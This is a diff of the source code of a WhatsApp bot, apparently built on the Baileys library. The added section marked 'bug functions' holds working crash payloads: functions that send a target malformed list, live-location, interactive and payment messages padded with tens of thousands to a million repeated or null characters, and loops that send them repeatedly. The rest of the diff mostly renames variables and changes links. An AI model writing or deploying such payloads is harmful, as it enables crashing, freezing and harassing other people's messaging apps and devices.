-*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*
-
-𝗗𝗮𝘀𝗮𝗿 
-𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
-𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
-
 ]
-
+}
+}
+}
 }
 
+const oneclickxeon = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+listResponseMessage: {
+title: `👑 KING`
 }
-
 }
-
 }
-
-
-async function bakdok(target, kuwoted) {
- var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-  "documentMessage": {
-    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
-    "mimetype": "penis",
-    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-    "fileLength": "999999999",
-    "pageCount": 999999999,
-    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-    "fileName": `𝐀𝐥𝐲𝐚 𝐂𝐫𝐚𝐬𝐡.doc`+"ྦྷ".repeat(60000),
-    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
-    "mediaKeyTimestamp": "1715880173"
-  }
-}), { userJid: target, quoted: kuwoted });
-await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
-}
-
-async function penghitaman(target, kuwoted) {
+async function blackening(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   "stickerMessage": {
     "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
@@ -1208,9 +392,416 @@ async function penghitaman(target, kuwoted) {
 await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
 }
 
-async function iponcrash(target) {
+async function locationxeony(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `👑 KING 👑 KING 👑 KING 👑 KING 👑 KING 👑 KING 👑 KING`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
+
+async function xeonkillpic(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    interactiveMessage: {
+      header: {
+        title: "👑 KING",
+        hasMediaAttachment: true,
+        ...(await prepareWAMessageMedia({ image: { url: "https://f.uguu.se/BhFPUUTG.jpg" } }, { upload: AlyaBotInc.waUploadToServer }))
+      },
+      body: {
+        text: ""
+      },
+      footer: {
+        text: "›          #👑 KING"
+      },
+      nativeFlowMessage: {
+        messageParamsJson: " ".repeat(1000000)
+      }
+    }
+}), { userJid: target, quoted: kuwoted });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function aipong(target) {
 await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
-} 
+}
+
+async function listxeonfck(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  'listMessage': {
+    'title': "👑 KING"+" ".repeat(920000),
+        'footerText': `👑 KING 👑 KING 👑 KING 👑 KING 👑 KING 👑 KING 👑 KING`,
+        'description': `👑 KING 👑 KING 👑 KING 👑 KING 👑 KING 👑 KING 👑 KING`,
+        'buttonText': null,
+        'listType': 2,
+        'productListInfo': {
+          'productSections': [{
+            'title': 'anjay',
+            'products': [
+              { "productId": "4392524570816732" }
+            ]
+          }],
+          'productListHeaderImage': {
+            'productId': '4392524570816732',
+            'jpegThumbnail': null
+          },
+          'businessOwnerJid': '0@s.whatsapp.net'
+        }
+      },
+      'footer': 'puki',
+      'contextInfo': {
+        'expiration': 604800,
+        'ephemeralSettingTimestamp': "1679959486",
+        'entryPointConversionSource': "global_search_new_chat",
+        'entryPointConversionApp': "whatsapp",
+        'entryPointConversionDelaySeconds': 9,
+        'disappearingMode': {
+          'initiator': "INITIATED_BY_ME"
+        }
+      },
+      'selectListType': 2,
+      'product_header_info': {
+        'product_header_info_id': 292928282928,
+        'product_header_is_rejected': false
+      }
+    }), { userJid: target, quoted: oneclickxeon });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+
+const sendReaction = async reactionContent => {
+  AlyaBotInc.sendMessage(m.chat, {
+    'react': {
+      'text': reactionContent,
+      'key': m.key
+    }
+  });
+};
+
+async function sendRepeatedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+   AlyaBotInc.sendMessage(recipientJid, {
+      'text': ''.repeat(50000)
+    }, {
+      'participant': {
+        'jid': jid
+      },
+      'messageId': etc.key.id
+    }, {
+      'quoted': m
+    });
+  }
+}
+
+async function sendViewOnceMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    let messageContent = generateWAMessageFromContent(jid, {
+      'viewOnceMessage': {
+        'message': {
+          'messageContextInfo': {
+            'deviceListMetadata': {},
+            'deviceListMetadataVersion': 2
+          },
+          'interactiveMessage': proto.Message.InteractiveMessage.create({
+            'body': proto.Message.InteractiveMessage.Body.create({
+              'text': ''
+            }),
+            'footer': proto.Message.InteractiveMessage.Footer.create({
+              'text': ''
+            }),
+            'header': proto.Message.InteractiveMessage.Header.create({
+              'title': '',
+              'subtitle': '',
+              'hasMediaAttachment': false
+            }),
+            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(100000)
+            })
+          })
+        }
+      }
+    }, {});
+    AlyaBotInc.relayMessage(jid, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
+  }
+}
+
+async function sendSystemCrashMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'interactiveMessage': {
+          'header': {
+            'title': '',
+            'subtitle': " "
+          },
+          'body': {
+            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
+          },
+          'footer': {
+            'text': 'xp'
+          },
+          'nativeFlowMessage': {
+            'buttons': [{
+              'name': 'cta_url',
+              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
+            }],
+            'messageParamsJson': "\0".repeat(1000000)
+          }
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+async function sendListMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'listMessage': {
+      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
+      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'buttonText': null,
+      'listType': 2,
+      'productListInfo': {
+        'productSections': [{
+          'title': "lol",
+          'products': [{
+            'productId': "4392524570816732"
+          }]
+        }],
+        'productListHeaderImage': {
+          'productId': "4392524570816732",
+          'jpegThumbnail': null
+        },
+        'businessOwnerJid': "0@s.whatsapp.net"
+      }
+    },
+    'footer': "lol",
+    'contextInfo': {
+      'expiration': 600000,
+      'ephemeralSettingTimestamp': "1679959486",
+      'entryPointConversionSource': "global_search_new_chat",
+      'entryPointConversionApp': "whatsapp",
+      'entryPointConversionDelaySeconds': 9,
+      'disappearingMode': {
+        'initiator': "INITIATED_BY_ME"
+      }
+    },
+    'selectListType': 2,
+    'product_header_info': {
+      'product_header_info_id': 292928282928,
+      'product_header_is_rejected': false
+    }
+  }), {
+    'userJid': jid
+  });
+  
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+
+async function sendLiveLocationMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'liveLocationMessage': {
+          'degreesLatitude': 'p',
+          'degreesLongitude': 'p',
+          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
+          'sequenceNumber': '0',
+          'jpegThumbnail': ''
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+
+async function sendExtendedTextMessage(jid) {
+  AlyaBotInc.relayMessage(jid, {
+    'extendedTextMessage': {
+      'text': '.',
+      'contextInfo': {
+        'stanzaId': jid,
+        'participant': jid,
+        'quotedMessage': {
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
+        },
+        'disappearingMode': {
+          'initiator': "CHANGED_IN_CHAT",
+          'trigger': "CHAT_SETTING"
+        }
+      },
+      'inviteLinkGroupTypeV2': "DEFAULT"
+    }
+  }, {
+    'participant': {
+      'jid': jid
+    }
+  }, {
+    'messageId': null
+  });
+}
+async function sendPaymentInvite(jid) {
+  AlyaBotInc.relayMessage(jid, {
+    'paymentInviteMessage': {
+      'serviceType': "UPI",
+      'expiryTimestamp': Date.now() + 86400000
+    }
+  }, {
+    'participant': {
+      'jid': jid
+    }
+  });
+}
+
+async function sendMultiplePaymentInvites(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendPaymentInvite(jid);
+    sendExtendedTextMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendVariousMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendListMessage(jid);
+    sendLiveLocationMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendRepeatedMessages2(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendSystemCrashMessage(jid);
+    sendSystemCrashMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendMixedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendLiveLocationMessage(jid);
+    sendListMessage(jid);
+    await sleep(500);
+  }
+}
+
+function sendMessageWithMentions(text, mentions = [], quoted = false) {
+  if (quoted == null || quoted == undefined || quoted == false) {
+    return AlyaBotInc.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  } else {
+    return AlyaBotInc.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  }
+}
+
+const xbug2 = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false, 
+participant: '0@s.whatsapp.net'
+},
+message: {
+listResponseMessage: {
+title: botname
+}
+}
+}
+
+const fakeflow = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false,
+participant: '0@s.whatsapp.net'
+},
+'message': {
+"interactiveMessage": {
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": bimg
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+};
+
+const xeonimun = (texto) => {
+AlyaBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
+return reply("Erro..")
+})
+}
+
+const subscribe_qalya = {
+"key": { 
+"fromMe": false,
+"participant": '0@s.whatsapp.net',
+"remoteJid": 'status@broadcast' 
+},
+message: {
+"listResponseMessage": {
+title: `Xeon's ur father`
+}}
+}
+async function XeonyCrashy(qalya,chat) {
+AlyaBotInc.sendMessage(chat, {
+document: {url: './settings.js'},
+mimetype: `image/null`,
+fileName: `${qalya}.${alyatext1}` ,
+caption: `${qalya + alyatext1}`,
+}, {quoted: subscribe_qalya })
+}
 //=============={End of bug functions}============\\
 
         //premium
@@ -1238,7 +829,7 @@ await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
                             body: ownername,
                             previewType: "PHOTO",
                             thumbnail: fs.readFileSync('./AlyaMedia/theme/alya.jpg'),
-                            sourceUrl: wagc
+                            sourceUrl: king
                         }
                     },
                     text: teks
@@ -1254,7 +845,7 @@ await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
                         title: botname,
                         body: ownername,
                         thumbnail: fs.readFileSync('./AlyaMedia/theme/alya.jpg'),
-                        sourceUrl: websitex,
+                        sourceUrl: king,
                         mediaType: 1,
                         renderLargerThumbnail: true
                      }
@@ -1267,7 +858,7 @@ await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
         
         //fake reply with channel link embedded
 async function replygcalya2(txt) {
-const xeonnewrep = {      
+const alyanewrep = {      
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
@@ -1280,12 +871,12 @@ showAdAttribution: true,
 title: botname,
 body: ownername,
 thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
-sourceUrl: websitex
+sourceUrl: king
 },
 },
 text: txt,
 }
-return AlyaBotInc.sendMessage(from, xeonnewrep, {
+return AlyaBotInc.sendMessage(from, alyanewrep, {
 quoted: m,
 })
 }
@@ -1541,7 +1132,7 @@ return build_server + data.image
 }
 
 //autoreact
-const xeonreact = async () => {
+const alyareact = async () => {
   const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
   for (const emoji of emojis) {
     await sleep(80);
@@ -1690,9 +1281,9 @@ function formatDuration(ms) {
         }
         async function resetLimit() {
             let users = Object.keys(global.db.data.users)
-            let Limitxeon = isPremium ? limit.prem : limit.free
+            let LimitAlya = isPremium ? limit.prem : limit.free
             for (let i of users) {
-               db.data.users[i].limit = Limitxeon
+               db.data.users[i].limit = LimitAlya
             }
             AlyaBotInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
         }
@@ -1727,22 +1318,22 @@ function formatDuration(ms) {
      //auto type record
         if (db.data.settings[botNumber].autorecordtype){
         if (isCommand) {
-            let xeonmix = ['composing', 'recording']
-            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
-            AlyaBotInc.sendPresenceUpdate(xeonmix2, from)
+            let alyamix = ['composing', 'recording']
+            alyamix2 = alyamix[Math.floor(alyamix.length * Math.random())]
+            AlyaBotInc.sendPresenceUpdate(alyamix2, from)
         }
         }
         if (db.data.settings[botNumber].autorecord){
         if (isCommand) {
-        	let xeonmix = ['recording']
-            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
-            AlyaBotInc.sendPresenceUpdate(xeonmix2, from)
+        	let alyamix = ['recording']
+            alyamix2 = alyamix[Math.floor(alyamix.length * Math.random())]
+            AlyaBotInc.sendPresenceUpdate(alyamix2, from)
         }
         }
         if (db.data.settings[botNumber].autotype){
         if (isCommand) {
-        	let xeonpos = ['composing']
-            AlyaBotInc.sendPresenceUpdate(xeonpos, from)
+        	let alyapos = ['composing']
+            AlyaBotInc.sendPresenceUpdate(alyapos, from)
         }
         }
         
@@ -1787,7 +1378,7 @@ list.push({
     
     //antispam kick
 if (db.data.chats[m.chat].antispam) {
-if (m.isGroup && m.message && xeon_antispam.isFiltered(from)) {
+if (m.isGroup && m.message && alya_antispam.isFiltered(from)) {
 console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
 return await AlyaBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 }
@@ -2099,27 +1690,27 @@ const alyafeature = () =>{
   console.error("Error in 'send message' handling:", error);
 }
         //autoreply
-for (let BhosdikaXeon of VoiceNoteXeon) {
-if (budy === BhosdikaXeon) {
-let audiobuffy = fs.readFileSync(`./AlyaMedia/audio/${BhosdikaXeon}.mp3`)
+for (let ReplyAlya of VoiceNoteAlya) {
+if (budy === ReplyAlya) {
+let audiobuffy = fs.readFileSync(`./AlyaMedia/audio/${ReplyAlya}.mp3`)
 AlyaBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 }
 }
-for (let BhosdikaXeon of StickerAlya){
-if (budy === BhosdikaXeon){
-let stickerbuffy = fs.readFileSync(`./AlyaMedia/sticker/${BhosdikaXeon}.webp`)
+for (let ReplyAlya of StickerAlya){
+if (budy === ReplyAlya){
+let stickerbuffy = fs.readFileSync(`./AlyaMedia/sticker/${ReplyAlya}.webp`)
 AlyaBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
 }
 }
-for (let BhosdikaXeon of ImageAlya){
-if (budy === BhosdikaXeon){
-let imagebuffy = fs.readFileSync(`./AlyaMedia/image/${BhosdikaXeon}.jpg`)
+for (let ReplyAlya of ImageAlya){
+if (budy === ReplyAlya){
+let imagebuffy = fs.readFileSync(`./AlyaMedia/image/${ReplyAlya}.jpg`)
 AlyaBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
 }
 }
-for (let BhosdikaXeon of VideoAlya){
-if (budy === BhosdikaXeon){
-let videobuffy = fs.readFileSync(`./AlyaMedia/video/${BhosdikaXeon}.mp4`)
+for (let ReplyAlya of VideoAlya){
+if (budy === ReplyAlya){
+let videobuffy = fs.readFileSync(`./AlyaMedia/video/${ReplyAlya}.mp4`)
 AlyaBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
 }
 }
@@ -2127,9 +1718,9 @@ AlyaBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
 const sendapk = (teks) => {
 AlyaBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
 }
-for (let BhosdikaXeon of ApkXeon) {
-if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./AlyaMedia/apk/${BhosdikaXeon}.apk`)
+for (let ReplyAlya of ApkAlya) {
+if (budy === ReplyAlya) {
+let buffer = fs.readFileSync(`./AlyaMedia/apk/${ReplyAlya}.apk`)
 sendapk(buffer)
 }
 }
@@ -2137,9 +1728,9 @@ sendapk(buffer)
 const sendzip = (teks) => {
 AlyaBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
 }
-for (let BhosdikaXeon of ZipXeon) {
-if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./AlyaMedia/zip/${BhosdikaXeon}.zip`)
+for (let ReplyAlya of ZipAlya) {
+if (budy === ReplyAlya) {
+let buffer = fs.readFileSync(`./AlyaMedia/zip/${ReplyAlya}.zip`)
 sendzip(buffer)
 }
 }
@@ -2147,9 +1738,9 @@ sendzip(buffer)
 const senddocu = (teks) => {
 AlyaBotInc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
 }
-for (let BhosdikaXeon of DocAlya) {
-if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./AlyaMedia/doc/${BhosdikaXeon}.pdf`)
+for (let ReplyAlya of DocAlya) {
+if (budy === ReplyAlya) {
+let buffer = fs.readFileSync(`./AlyaMedia/doc/${ReplyAlya}.pdf`)
 senddocu(buffer)
 }
 }
@@ -2363,8 +1954,8 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
         
         //user db
         if (isCommand && !isUser) {
-xeonverifieduser.push(sender)
-fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, null, 2))
+alyachoosen.push(sender)
+fs.writeFileSync('./src/data/role/user.json', JSON.stringify(alyachoosen, null, 2))
 }
         
         switch (isCommand) {
@@ -4280,7 +3871,7 @@ case 'block': case 'ban': {
                                 title: botname,
                                 body: `Sent in ${i.length} Group`,
                                 thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
-                                sourceUrl: wagc,
+                                sourceUrl: king,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
                             }
@@ -4823,7 +4414,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             let [poll, opt] = text.split("|")
             if (text.split("|") < 2)
                 return await replygcalya(
-                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
+                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|king,alya,rice.......`
                 )
             let options = []
             for (let i of opt.split(',')) {
@@ -6277,7 +5868,7 @@ replygcalya(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks
 }
 break
 case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
-           	if (!text) return replygcalya(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
+           	if (!text) return replygcalya(`Provide Number with last number x\n\nExample: ${prefix + command} 234912xxxxxxx`)
 var inputnumber = text.split(" ")[0]
         
         replygcalya(`Searching for WhatsApp account in given range...`)
@@ -6337,11 +5928,11 @@ break
 case 'getcontact': case 'getcon': {
 if (!m.isGroup) return AlyaStickGroup()
 if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
-xeonbigpp = await AlyaBotInc.sendMessage(m.chat, {
+alyabigpp = await AlyaBotInc.sendMessage(m.chat, {
     text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
 }, {quoted: m, ephemeralExpiration: 86400})
 await sleep(1000)
-AlyaBotInc.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
+AlyaBotInc.sendContact(m.chat, participants.map(a => a.id), alyabigpp)
 }
 break
 case 'savecontact': case 'svcontact':{
@@ -6540,7 +6131,7 @@ if (!AlyaTheQueen) return AlyaStickOwner()
  if (!m.isGroup) return AlyaStickGroup()
  if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
  if (!isBotAdmins) return AlyaStickBotAdmin()
-  const xeonkickall = (args[0] === 'numBut')
+  const alyakickall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
   : (Number(args[0]))
     ? groupMetadata.participants
